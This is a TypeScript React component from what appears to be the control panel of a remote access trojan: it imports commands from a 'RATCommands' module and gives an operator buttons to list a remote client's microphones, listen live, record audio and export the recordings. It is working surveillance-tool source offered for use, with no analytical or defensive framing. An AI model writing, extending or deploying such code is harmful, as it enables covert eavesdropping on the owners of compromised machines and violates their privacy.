import React, { useEffect, useRef, useState } from "react";
import { useParams } from "react-router-dom";
import { listen } from "@tauri-apps/api/event";
import {
  requestMicDevicesCmd,
  startMicLiveCmd,
  stopMicLiveCmd,
  startMicRecordingCmd,
  stopMicRecordingCmd,
} from "../rat/RATCommands";
import {
  IconMicrophone,
  IconPlayerPlay,
  IconPlayerPause,
  IconDownload,
  IconDeviceFloppy,
  IconCircleCheck,
} from "@tabler/icons-react";

type MicAudioPayload = {
  addr: string;
  timestamp: number;
  sampleRate: number;
  channels: number;
  data: string;
};

type MicDeviceInfo = {
  id: string;
  name: string;
};

type MicDeviceListPayload = {
  addr: string;
  devices: MicDeviceInfo[];
};

type FilePayload = {
  addr: string;
  name: string;
  data: string;
};

const base64ToUint8Array = (base64: string) => {
  const binary = window.atob(base64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i += 1) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
};

const generateWaveform = (payload: MicAudioPayload) => {
    const bytes = base64ToUint8Array(payload.data);
    const samples = new Int16Array(bytes.buffer);
    const channelCount = payload.channels;
    const frameCount = Math.floor(samples.length / channelCount);
    const bucketSize = Math.max(1, Math.floor(frameCount / 128));
    const waveformPoints: number[] = [];

    for (let bucket = 0; bucket < 128; bucket += 1) {
      const start = bucket * bucketSize * channelCount;
      const end = Math.min(samples.length, start + bucketSize * channelCount);
      let maxAmp = 0;
      for (let i = start; i < end; i += channelCount) {
        const left = Math.abs(samples[i]);
        const right = channelCount > 1 && i + 1 < samples.length ? Math.abs(samples[i + 1]) : 0;
        maxAmp = Math.max(maxAmp, left, right);
      }
      waveformPoints.push(maxAmp / 32768);
    }

    return waveformPoints;
  };

  const playAudioChunk = async (payload: MicAudioPayload, audioContext: AudioContext) => {
  const bytes = base64ToUint8Array(payload.data);
  const samples = new Int16Array(bytes.buffer);
  const frameCount = Math.floor(samples.length / payload.channels);
  const buffer = audioContext.createBuffer(
    payload.channels,
    frameCount,
    payload.sampleRate
  );

  for (let channel = 0; channel < payload.channels; channel += 1) {
    const channelData = buffer.getChannelData(channel);
    for (let i = 0; i < frameCount; i += 1) {
      const sample = samples[i * payload.channels + channel];
      channelData[i] = Math.max(-1, Math.min(1, sample / 32768));
    }
  }

  const source = audioContext.createBufferSource();
  source.buffer = buffer;
  source.connect(audioContext.destination);
  source.start();
};

export const MicAccess: React.FC = () => {
  const { addr } = useParams();
  const [liveActive, setLiveActive] = useState(false);
  const [recordingActive, setRecordingActive] = useState(false);
  const [fileName, setFileName] = useState<string | null>(null);
  const [fileData, setFileData] = useState<string | null>(null);
  const [status, setStatus] = useState("Ready");
  const [waveform, setWaveform] = useState<number[]>([]);
  const [micDevices, setMicDevices] = useState<MicDeviceInfo[]>([]);
  const [selectedDeviceId, setSelectedDeviceId] = useState<string>("");
  const audioContextRef = useRef<AudioContext | null>(null);
  const waveformCanvasRef = useRef<HTMLCanvasElement | null>(null);

  useEffect(() => {
    audioContextRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();

    const unlistenMic = listen("mic_audio_chunk", (event: any) => {
      const payload = event.payload as MicAudioPayload;
      if (!addr || payload.addr !== addr) return;
      if (!audioContextRef.current) return;
      playAudioChunk(payload, audioContextRef.current);
      setWaveform(generateWaveform(payload));
    });

    const unlistenDevices = listen("mic_device_list", (event: any) => {
      const payload = event.payload as MicDeviceListPayload;
      if (!addr || payload.addr !== addr) return;
      setMicDevices(payload.devices);
      if (payload.devices.length > 0) {
        setSelectedDeviceId((prev) => prev || payload.devices[0].id);
      }
    });

    const unlistenFile = listen("mic_recording_file", (event: any) => {
      const payload = event.payload as FilePayload;
      if (!addr || payload.addr !== addr) return;
      setFileName(payload.name);
      setFileData(payload.data);
      setStatus("Mic recording ready");
    });

    return () => {
      unlistenMic.then((fn) => fn());
      unlistenDevices.then((fn) => fn());
      unlistenFile.then((fn) => fn());
      if (audioContextRef.current) {
        audioContextRef.current.close();
      }
    };
  }, [addr]);

  useEffect(() => {
    if (!addr) return;
    requestMicDevicesCmd(addr);
  }, [addr]);

  useEffect(() => {
    const canvas = waveformCanvasRef.current;
    if (!canvas || waveform.length === 0) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    const width = canvas.width;
    const height = canvas.height;

    ctx.fillStyle = "#0f172a";
    ctx.fillRect(0, 0, width, height);
    ctx.strokeStyle = "#34d399";
    ctx.lineWidth = 2;
    ctx.beginPath();

    waveform.forEach((value, index) => {
      const x = (index / (waveform.length - 1)) * width;
      const y = height / 2 - value * (height / 2 - 4);
      if (index === 0) {
        ctx.moveTo(x, y);
      } else {
        ctx.lineTo(x, y);
      }
    });

    ctx.stroke();
  }, [waveform]);

  const startLive = async () => {
    if (!addr) return;
    await startMicLiveCmd(addr, selectedDeviceId);
    setLiveActive(true);
    setStatus("Live listening started");
  };

  const stopLive = async () => {
    if (!addr) return;
    await stopMicLiveCmd(addr);
    setLiveActive(false);
    setStatus("Live listening stopped");
  };

  const startRecording = async () => {
    if (!addr) return;
    await startMicRecordingCmd(addr, selectedDeviceId);
    setRecordingActive(true);
    setStatus("Recording microphone...");
  };

  const stopRecording = async () => {
    if (!addr) return;
    await stopMicRecordingCmd(addr);
    setRecordingActive(false);
    setStatus("Recording stopped");
  };

  const exportFile = async () => {
    if (!fileName || !fileData) return;
    const bytes = base64ToUint8Array(fileData);
    const blob = new Blob([bytes], { type: "application/octet-stream" });
    const url = URL.createObjectURL(blob);
    const anchor = document.createElement("a");
    anchor.href = url;
    anchor.download = fileName;
    document.body.appendChild(anchor);
    anchor.click();
    anchor.remove();
    URL.revokeObjectURL(url);
    setStatus(`Saved file ${fileName}`);
  };

  return (
    <div className="p-6 w-full h-screen bg-primarybg flex flex-col gap-6 text-white">
      <div className="flex items-center gap-3">
        <IconMicrophone size={28} />
        <div>
          <h1 className="text-2xl font-semibold">Mic Access</h1>
          <p className="text-sm text-gray-400">Live listen or record microphone audio from the client.</p>
        </div>
      </div>

      <div className="grid grid-cols-1 gap-4">
        <div className="rounded-xl border border-accentx p-4 bg-secondarybg">
          <label className="block text-gray-300 mb-2">Microphone device</label>
          <div className="flex gap-2 items-center">
            <select
              className="flex-1 rounded-xl border border-accentx bg-primarybg px-3 py-2 text-white"
              value={selectedDeviceId}
              onChange={(e) => setSelectedDeviceId(e.target.value)}
            >
              {micDevices.map((device) => (
                <option key={device.id} value={device.id}>
                  {device.name}
                </option>
              ))}
            </select>
            <button
              className="py-2 px-4 rounded-xl bg-slate-700 hover:bg-slate-600 transition"
              onClick={() => requestMicDevicesCmd(addr)}
            >
              Refresh
            </button>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <button
          className="py-3 px-5 rounded-xl bg-green-600 hover:bg-green-500 transition"
          onClick={startLive}
          disabled={liveActive}
        >
          <IconPlayerPlay size={18} className="inline-block mr-2" /> Start Live Listen
        </button>
        <button
          className="py-3 px-5 rounded-xl bg-red-600 hover:bg-red-500 transition"
          onClick={stopLive}
          disabled={!liveActive}
        >
          <IconPlayerPause size={18} className="inline-block mr-2" /> Stop Live Listen
        </button>
        <button
          className="py-3 px-5 rounded-xl bg-blue-600 hover:bg-blue-500 transition"
          onClick={startRecording}
          disabled={recordingActive}
        >
          <IconDeviceFloppy size={18} className="inline-block mr-2" /> Start Recording
        </button>
        <button
          className="py-3 px-5 rounded-xl bg-orange-600 hover:bg-orange-500 transition"
          onClick={stopRecording}
          disabled={!recordingActive}
        >
          <IconPlayerPause size={18} className="inline-block mr-2" /> Stop Recording
        </button>
      </div>
    </div>

      <div className="space-y-4">
        <div className="rounded-xl border border-accentx p-4 bg-secondarybg">
          <div className="flex items-center gap-2 text-gray-300">
            <IconCircleCheck size={18} />
            <span>Status</span>
          </div>
          <p className="mt-2 text-white">{status}</p>
          {waveform.length > 0 && (
            <div className="mt-4">
              <div className="text-sm text-gray-400 mb-2">Live waveform</div>
              <canvas
                ref={waveformCanvasRef}
                width={800}
                height={140}
                className="w-full rounded-xl border border-accentx bg-slate-950"
              />
            </div>
          )}
        </div>

        {fileName && fileData && (
          <div className="rounded-xl border border-accentx p-4 bg-secondarybg flex flex-col gap-3">
            <div className="flex items-center justify-between">
              <span className="text-white font-medium">Recorded File</span>
              <button
                className="text-sm text-blue-300 hover:text-white"
                onClick={exportFile}
              >
                <IconDownload size={18} className="inline-block mr-2" /> Export file
              </button>
            </div>
            <p className="text-gray-300">{fileName}</p>
          </div>
        )}
      </div>
    </div>
  );
};
